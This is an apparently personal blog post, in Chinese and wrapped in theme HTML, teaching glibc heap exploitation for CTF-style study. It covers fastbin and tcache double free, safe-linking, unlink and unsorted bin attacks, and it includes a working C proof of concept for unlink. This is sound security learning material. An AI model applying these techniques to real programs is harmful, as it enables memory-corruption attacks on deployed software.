<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Static">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2024/01/23/glibc堆学习/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="漫长的二进制之旅">
<meta property="og:type" content="article">
<meta property="og:title" content="Glibc堆学习及_IO_FILE利用">
<meta property="og:url" content="http://example.com/2024/01/23/Glibc%E5%A0%86%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="漫长的二进制之旅">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-01-23T07:51:11.395Z">
<meta property="article:modified_time" content="2023-11-12T07:54:28.385Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="UAF Unlink Unsortedbin_attack Largebin_attack Tcache_stashing_unlink_attack House_of_einherjar IO_FILE_attack House_of_botcake House_of_orange House_of_corrosion House_of_banana House_of_cat">
<meta name="twitter:card" content="summary">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/cat-96.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-96.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/cat-96.png">
    <!--- Page Info-->
    
    <title>
        
            Glibc堆学习及_IO_FILE利用 -
        
        Static&#39;s blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    
        <style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    
<script src="/js/libs/anime.min.js"></script>

    <h1 class="ml13">
        Static&#39;s blog
    </h1>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });


        anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [100,0],
                translateZ: 0,
                opacity: [0,1],
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i
            }).add({
            targets: '.ml13 .letter',
            translateY: [0,-100],
            opacity: [1,0],
            easing: "easeInExpo",
            duration: 1200,
            delay: (el, i) => 100 + 30 * i
        });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
        });

        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
        hidePreloaderAfterTimeout(5000);

        function hidePreloaderAfterTimeout(delay) {
            setTimeout(function () {
                var preloader = document.querySelector('.preloader');
                preloader.style.opacity = '0';
                setTimeout(function () {
                    preloader.style.display = 'none';
                }, 200);
            }, delay);
        }
    </script>
</div>
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/chuyin1.jpg","dark":"/images/JIJIAN.jpg"},"title":"Welcome here!","subtitle":{"text":["光阴有限同归老，风月无涯可慰颜。"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">

    <div class="navbar-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/cat-96.png">
                </a>
            
            <a class="logo-title" href="/">
                
                Static&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Glibc堆学习及_IO_FILE利用</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/OIP-C.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Static</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-01-23 15:51:11</span>
        <span class="mobile">2024-01-23 15:51:11</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2023-11-12 15:54:28</span>
            <span class="mobile">2023-11-12 15:54:28</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/UAF-Unlink-Unsortedbin-attack-Largebin-attack-Tcache-stashing-unlink-attack-House-of-einherjar-IO-FILE-attack-House-of-botcake-House-of-orange-House-of-corrosion-House-of-banana-House-of-cat/">UAF Unlink Unsortedbin_attack Largebin_attack Tcache_stashing_unlink_attack House_of_einherjar IO_FILE_attack House_of_botcake House_of_orange House_of_corrosion House_of_banana House_of_cat</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>在<code>free(p)</code>之后未对指针<code>p</code>置空，可配合其他可利用因素进行攻击</p>
<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><h4 id="libc-2-31及之前"><a href="#libc-2-31及之前" class="headerlink" title="libc-2.31及之前"></a>libc-2.31及之前</h4><p>fastbin只会在放入fastbin时检查链表头指向的chunk是否<code>double free</code>，因此构造fastbin为<code>p1-&gt;p2-&gt;p1</code>，然后再将p1申请出来，更改p1的fd指针为我们想要修改的地址，此时fastbin为<code>p2-&gt;p1-&gt;target</code>，最后即可获得对应地址的写入权限。但是在这一过程中要注意的是<code>target-&gt;size</code>位置必须为<strong>这个fastbin链表的size</strong>，因为在申请时会进行检查。</p>
<h4 id="libc-2-32以后"><a href="#libc-2-32以后" class="headerlink" title="libc-2.32以后"></a>libc-2.32以后</h4><p>在2.32版本中，对tcach和fastbin都加入了保护机制，即对fd指针进行了<strong>异或加密</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure></div>

<p><code>ptr</code>为next对应的地址，<code>pos</code>为当前堆块的地址</p>
<p>在放入对应链表时，会进行<code>PROTECT_PTR(pos, ptr)</code>操作，即抹去pos后三位信息然后与ptr异或，放入fd位置。由于异或加密的可逆性，解密时直接与<code>pos &gt;&gt; 12</code>异或就可以得到ptr。同时，在链表中只有一个chunk时，fd也会进行加密，而其next实际为0，因此会有<code>fd = (pos &gt;&gt; 12) ^ 0</code>，此时fd存储的就是堆块地址，我们可以通过这个机制泄露出堆地址，依然可以进行后续的利用。</p>
<h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><h4 id="libc-2-28及之前"><a href="#libc-2-28及之前" class="headerlink" title="libc-2.28及之前"></a>libc-2.28及之前</h4><p>在libc-2.28及之前tcache并不会检查<code>double free</code>，并且tcach不会检查size，我们可以直接free两次，申请一次，在fd写入<code>target</code>，再申请到<code>target</code>直接任意读写</p>
<h4 id="libc-2-29到libc-2-31"><a href="#libc-2-29到libc-2-31" class="headerlink" title="libc-2.29到libc-2.31"></a>libc-2.29到libc-2.31</h4><p>libc-2.29中加入了对tcache的<code>double free</code>检查，具体是在<code>tcache_entry</code>中加入了一个<code>key</code>，在chunk中体现为bk位置修改为key，当chunk被放入tcache时检查bk位置是否存在key，若存在就报错<code>double free</code>。如果我们可以修改chunk的bk位置，那么就可以清空key而绕过检查，仍旧很容易利用。</p>
<p>同时，我们可利用<code>fastbin double free</code>配合tcache，具体利用方法是：先malloc九次，然后free七个chunk，这时tcache被填满<code>p6-&gt;p5-&gt;p4-&gt;p3-&gt;p2-&gt;p1-&gt;p0</code>，再free剩下的两个chunk，这时chunk会在fastbin里面<code>p8-&gt;p7</code>，再free掉p7，fastbin内变成<code>p7-&gt;p8-&gt;p7</code>，这时malloc七次清空tcache，再次将<code>p7</code>malloc出来时，由于<code>tcache stash（简单来说就是，在从fastbin和small bin中取chunk的时候，会尽可能的把剩余的其他chunk也一起放入tcache bin中）</code>机制，剩下的会被放入tcache中<code>p8-&gt;p7</code>。由于我们刚刚拿到了<code>p7指向的chunk</code>，因此我们可以修改其fd位置为target，然后tcache中就变成了<code>p8-&gt;p7-&gt;target</code>，然后就可以直接利用了。</p>
<h4 id="libc-2-32以后-1"><a href="#libc-2-32以后-1" class="headerlink" title="libc-2.32以后"></a>libc-2.32以后</h4><p>与fastbin在libc-2.32以后新增的保护相同，利用方式参照其即可。</p>
<p><strong>要注意的是：</strong>在利用时要保持要利用位置的<code>tcache_counts &gt; 0</code>，这是因为存在保护<code>assert (tcache-&gt;counts[tc_idx] &gt; 0);</code>，这个保护似乎从libc-2.27开始一直存在于tcache中</p>
<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>unlink漏洞存在于含有双向链表的bin中，在我们对chunk进行精心的内存布局后，可以借助unlink操作来达到修改指针的效果。</p>
<p>古老的unlink检查比较少，利用起来也相对容易，但对当前学习没有太大价值，因此我们直接看当前的unlink机制就行。</p>
<p>在最新的glibc2.37下，unlink_chunk函数（似乎一直以来都没变过，只是把原来的宏换成了函数）如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))         	<span class="comment">//检查 p-&gt;size == p-&gt;next-&gt;presize</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))		<span class="comment">//检查确保 p 在链中</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;					<span class="comment">//使 p 脱链，由 bk-&gt;p-&gt;fd 变为 bk-&gt;fd</span></span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">    <span class="comment">//以下都属于largebin的unlink处理</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;												<span class="comment">//判断是否在smallbin的范围内，并且fd_nextsize是否为空</span></span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)				<span class="comment">//判断链是否正确</span></span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)				<span class="comment">//若p是唯一结点</span></span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;								  <span class="comment">//正常双向链表删除元素</span></span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span>									<span class="comment">//更新 p 脱链后的 nextsize 指针</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>以64位下为例，对于绕过方式，实际上也非常简单。由于它要求 <code>p-&gt;fd-&gt;bk==p &amp;&amp; p-&gt;bk-&gt;fd==p &amp;&amp; p-&gt;size==p-&gt;next_chunk-&gt;pre_size</code>，而对于size的伪造无需赘述，直接在可控堆块上伪造一个<code>fake_chunk</code>就行，同时修改后一个chunk的<code>pre_size</code>位，并且需要控制<code>p-&gt;next_chunk-&gt;PRE_INUSE == 0</code>，这样才能触发unlink。而我们伪造的重点就在<code>p-&gt;fd-&gt;bk==p &amp;&amp; p-&gt;bk-&gt;fd==p</code>了，如果内存中存在一个指向p的指针，我们称之为<code>target</code>，那么我们就可以伪造<code>p-&gt;fd=target-0x18   p-&gt;bk=target-0x10</code>，从而绕过判断，在<code>target</code>位置写入<code>target-0x18</code>，在一定条件下可实现任意写。</p>
<p>一个简单的POC：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//验证高版本下的unlink漏洞</span></span><br><span class="line"><span class="type">char</span>* ChunkInfo[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//填满tcache</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">11</span>;i++)</span><br><span class="line">		ChunkInfo[i] = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">		<span class="built_in">free</span>(ChunkInfo[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The tcache bin is full.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修改参数</span></span><br><span class="line">	*((<span class="type">long</span>*)ChunkInfo[<span class="number">9</span>]<span class="number">-2</span>) = <span class="number">0x80</span>;    <span class="comment">//修改下一个chunk的presize位</span></span><br><span class="line">	*((<span class="type">long</span>*)ChunkInfo[<span class="number">9</span>]<span class="number">-1</span>) = <span class="number">0x90</span>;    <span class="comment">//修改下一个chunk的pre_inuse位为0</span></span><br><span class="line">	*((<span class="type">long</span>*)ChunkInfo[<span class="number">8</span>]) = <span class="number">0</span>;   <span class="comment">//fake_chunk的presize位</span></span><br><span class="line">	*((<span class="type">long</span>*)ChunkInfo[<span class="number">8</span>]+<span class="number">1</span>) = <span class="number">0x81</span>;  <span class="comment">//size位</span></span><br><span class="line">	*((<span class="type">long</span>*)ChunkInfo[<span class="number">8</span>]+<span class="number">2</span>) = (<span class="type">long</span>)(&amp;ChunkInfo[<span class="number">8</span>])<span class="number">-0x18</span>;   <span class="comment">//fd位</span></span><br><span class="line">	*((<span class="type">long</span>*)ChunkInfo[<span class="number">8</span>]+<span class="number">3</span>) = (<span class="type">long</span>)(&amp;ChunkInfo[<span class="number">8</span>])<span class="number">-0x10</span>;   <span class="comment">//bk位</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;修改前target位置 %p\n&quot;</span>, ChunkInfo[<span class="number">8</span>]);</span><br><span class="line">	<span class="built_in">free</span>(ChunkInfo[<span class="number">9</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;修改后target位置 %p\n&quot;</span>, ChunkInfo[<span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a>Unsorted bin attack</h2><p>这是一个比较古老的攻击技巧，从glibc-2.29开始，因为保护机制的增多，已经基本失效。而且这个攻击方式仅可作为辅助利用，攻击效果就是在任意位置写入一个不可控的大值。</p>
<p>glibc-2.27及以前检查部分：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">		   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">        size = chunksize (victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>再来看看实现写入的部分：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></div>

<p>结合上面的<code>bck = victim-&gt;bk</code>，我们只要能修改victim的bk位为<code>target-0x10</code>，然后那么target位置就能被修改为<code>unsorted_chunks (av)</code>。</p>
<p>glibc-2.28加入检测，需要在目标位置伪造fd：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>具体利用的POC可以看看how2heap仓库的 unsorted_bin_attack.c</p>
